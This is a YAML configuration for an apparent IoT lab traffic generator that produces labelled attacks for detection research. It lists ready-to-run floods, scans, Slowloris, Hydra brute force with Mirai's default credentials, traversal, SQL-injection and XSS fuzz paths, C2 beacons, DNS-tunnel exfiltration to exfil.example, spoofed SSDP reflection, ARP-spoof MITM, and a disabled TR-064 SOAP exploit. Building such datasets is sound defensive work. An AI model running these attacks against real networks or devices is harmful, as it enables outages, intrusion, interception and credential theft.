attacks:
  - name: xmas_flood
    label: XMAS_Flood
    enabled: true
    repeats: 3
    command:
      - nmap
      - -sX
      - -p
      - 1-100
      - "{target_ip}"

  - name: tcp_syn_flood
    label: TCP_SYN_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - -S
      - -c
      - "100"
      - -p
      - "443"
      - "{target_ip}"

  - name: udp_flood
    label: UDP_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - --udp
      - -c
      - "100"
      - -p
      - "53"
      - "{target_ip}"

  - name: http_flood
    label: HTTP_Flood
    enabled: true
    repeats: 3
    command:
      - hping3
      - -S
      - -c
      - "100"
      - -p
      - "80"
      - "{target_ip}"

  # Original FIRCE Concept drift
  - name: hulk_http_flood
    label: HULK_HTTP_Flood
    kind: hulk
    enabled: true
    repeats: 3
    duration_seconds: 60

  # Reconnaissance / Discovery (#75)
  - name: nmap_service_detection
    label: Nmap_Service_Detection
    enabled: true
    repeats: 3
    command:
      - nmap
      - -sV
      - -p
      - 1-1000
      - "{target_ip}"

  - name: ssdp_discovery
    label: SSDP_Discovery
    kind: ssdp_discovery
    enabled: true
    repeats: 3
    timeout_seconds: 3

  - name: banner_grab_http
    label: Banner_Grab_HTTP
    kind: banner_grab
    enabled: true
    repeats: 3
    port: 80
    timeout_seconds: 5
    probe: "HEAD / HTTP/1.0\r\nHost: {target_ip}\r\n\r\n"

  # Credential Access (#76)
  - name: hydra_http_default_creds
    label: Hydra_HTTP_Default_Creds
    kind: hydra_brute_force
    enabled: true
    repeats: 3
    service: http-get
    port: 80
    username_list:
      - admin
      - root
    password_list:
      - admin
      - "1234"
      - password
    max_attempts: 6
    tasks: 1

  # Application-layer (#77)
  - name: slowloris
    label: Slowloris
    enabled: true
    repeats: 3
    command:
      - slowhttptest
      - -c
      - "1000"
      - -H
      - -i
      - "10"
      - -r
      - "200"
      - -t
      - GET
      - -u
      - http://{target_ip}/
      - -x
      - "24"
      - -p
      - "3"

  - name: http_fuzz
    label: HTTP_Fuzz
    kind: http_fuzz
    enabled: true
    repeats: 3
    port: 80
    paths:
      - /../../../../etc/passwd
      - /..%2f..%2f..%2f..%2fetc%2fpasswd
      - "/'; DROP TABLE users;--"
      - "/<script>alert(1)</script>"
      - /%00
      - /.git/config
    timeout_seconds: 5

  # Lateral Movement / C2 (#78)
  - name: c2_beacon
    label: C2_Beacon
    kind: c2_beacon
    enabled: true
    repeats: 5
    port: 80
    path: /check-in
    jitter_seconds: 5
    timeout_seconds: 5

  # Exfiltration (#79)
  - name: exfil_sim
    label: Exfil_Sim
    kind: exfil_sim
    enabled: true
    repeats: 3
    port: 80
    path: /upload
    payload_size_bytes: 2000000
    chunk_size_bytes: 65536
    timeout_seconds: 10

  # Reflection/Amplification DDoS (#81)
  # 192.168.1.250 is a decoy spoofed-victim IP, not a real device on this
  # lab network - it is not present in devices.yaml. DNS/NTP reflection are
  # deliberately not included here: the lab devices are consumer IoT
  # hardware (hubs/cams/plugs) that expose UPnP/SSDP, not open DNS
  # resolvers or NTP servers, so spoofed DNS/NTP queries at them wouldn't
  # elicit any real amplified response - just non-functional traffic.
  - name: ssdp_reflection
    label: SSDP_Reflection
    enabled: true
    repeats: 3
    command:
      - hping3
      - --spoof
      - 192.168.1.250
      - --udp
      - -c
      - "5"
      - -p
      - "1900"
      - -E
      - configs/payloads/ssdp_msearch.txt
      - "{target_ip}"

  # Impact beyond flooding (#80)
  # Left disabled by default (and the config_tamper kind itself defaults to
  # enabled: false at the model level) - the request below is real and
  # protocol-correct, but whether it actually changes anything depends on
  # each specific device's firmware. Do not flip enabled: true without
  # vetting this exact path/body against the specific device it will run
  # against; a payload that succeeds could brick real lab hardware.
  - name: config_tamper_setup_cgi
    label: Config_Tamper_Setup_CGI
    kind: config_tamper
    enabled: false
    repeats: 1
    port: 80
    path: /setup.cgi
    method: POST
    body: "ssid=capex-test&wpa_psk=capex-test-tamper"
    timeout_seconds: 5

  # Impact #2 (#94) - TR-064 SOAP config-injection. Real, publicly
  # documented attack: in late 2016 Mirai variants exploited the TR-064
  # SOAP endpoint (/UD/act?1, CVE-2016-10372-adjacent pattern) to issue
  # unauthenticated device-restart/reconfigure commands over port 7547,
  # in the incident that knocked ~900k Deutsche Telekom routers offline.
  # Also left disabled by default - real exploit against real router/
  # gateway firmware, needs per-device vetting before enabling.
  - name: config_tamper_tr064_soap
    label: Config_Tamper_TR064_SOAP
    kind: config_tamper
    enabled: false
    repeats: 1
    port: 7547
    path: /UD/act?1
    method: POST
    content_type: 'text/xml; charset="utf-8"'
    soap_action: "urn:dslforum-org:service:Time:1#SetNTPServers"
    body: "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\"><NewNTPServer1>pool.ntp.org</NewNTPServer1></u:SetNTPServers></s:Body></s:Envelope>"
    timeout_seconds: 5

  # ARP Spoofing / MITM (#82)
  # interface/gateway_ip are placeholders - verify these match the actual
  # lab NIC and router address before enabling.
  - name: arp_spoof_gateway_mitm
    label: ARP_Spoof_Gateway_MITM
    kind: arp_spoof
    enabled: true
    repeats: 2
    interface: eth0
    gateway_ip: 192.168.1.1
    duration_seconds: 30

  # ARP Spoofing #2 (#96) - bidirectional (full) MITM. Poisons both the
  # device's cache (as above) and the gateway's cache entry for the
  # device, so return traffic is redirected too - real dsniff-based MITM
  # setups need both directions; single-direction alone often doesn't
  # achieve a working intercept.
  - name: arp_spoof_bidirectional_mitm
    label: ARP_Spoof_Bidirectional_MITM
    kind: arp_spoof
    enabled: true
    repeats: 2
    interface: eth0
    gateway_ip: 192.168.1.1
    duration_seconds: 30
    bidirectional: true

  # Credential Access #2 (#91) - real entries from Mirai's published
  # default-credential table (all root:X pairs below are literal entries
  # from that table, not a synthesized cartesian product).
  - name: hydra_telnet_mirai_creds
    label: Hydra_Telnet_Mirai_Creds
    kind: hydra_brute_force
    enabled: true
    repeats: 3
    service: telnet
    port: 23
    username_list:
      - root
    password_list:
      - xc3511
      - vizxv
      - admin
      - "888888"
      - xmhdipc
      - default
      - juantech
      - "54321"
    max_attempts: 8
    tasks: 1

  # Lateral Movement / C2 #2 (#92)
  - name: c2_dns_beacon
    label: C2_DNS_Beacon
    kind: c2_dns_beacon
    enabled: true
    repeats: 5
    port: 53
    domain: update-check.example
    jitter_seconds: 5
    timeout_seconds: 5

  # Exfiltration #2 (#93)
  - name: dns_tunnel_exfil
    label: DNS_Tunnel_Exfil
    kind: dns_tunnel_exfil
    enabled: true
    repeats: 3
    port: 53
    base_domain: exfil.example
    payload_size_bytes: 512
    chunk_size_bytes: 32
    timeout_seconds: 3

